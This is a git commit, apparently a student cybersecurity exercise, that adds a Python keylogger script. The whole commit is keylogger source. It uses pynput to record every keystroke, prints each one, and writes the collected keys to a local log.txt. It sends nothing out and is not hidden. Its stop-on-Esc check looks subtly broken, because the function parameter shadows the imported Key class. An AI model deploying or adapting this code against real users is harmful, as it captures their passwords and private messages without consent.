d1c1bef9350a0225a70fdfbb6e4b7b9046583af2
pritesh460 <kalsariyapritesh9999@gmail.com>
2025-06-30 20:14:16 +0530

    keylogger project

---
+++ cyberSecurity_project/Keylogger.py
@@ -0,0 +1,30 @@
+import pynput
+from pynput.keyboard import Key, Listener
+
+keys = []
+
+def on_press(Key):
+    keys.append(Key)
+    write_file(keys)
+
+    try:
+        print("alphanumeric key {0} pressed".format(Key.char))
+    except AttributeError:
+        print('special key {0} pressed'.format(Key))
+
+def write_file(keys):
+    with open('log.txt','w') as f:
+        for Key in keys:
+            k = str(Key).replace("'", "")
+            f.write(k)
+
+            f.write(' ')
+
+def on_release(Key):
+    print('{0} released'.format(Key))
+    if Key == Key.esc:
+        return False
+
+with Listener(on_press=on_press,
+                on_release=on_release) as Listener:
+    Listener.join()
